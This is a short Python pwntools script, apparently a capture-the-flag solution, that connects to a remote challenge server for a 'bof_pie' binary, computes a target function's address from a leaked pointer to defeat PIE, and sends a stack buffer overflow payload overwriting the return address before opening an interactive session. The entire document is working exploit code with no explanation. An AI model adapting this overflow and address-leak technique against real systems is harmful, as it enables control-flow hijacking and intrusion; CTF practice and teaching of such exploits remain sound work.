from pwn import *

# p = process('./bof_pie')
p = remote('ctf.j0n9hyun.xyz', 3008)
p.recvuntil('j0n9hyun is ')

welcome_addr = int(p.recv(10),16)

jong_addr = welcome_addr - 0x909 + 0x890

payload = b'a'*22+p32(jong_addr)

p.sendline(payload)

p.interactive()
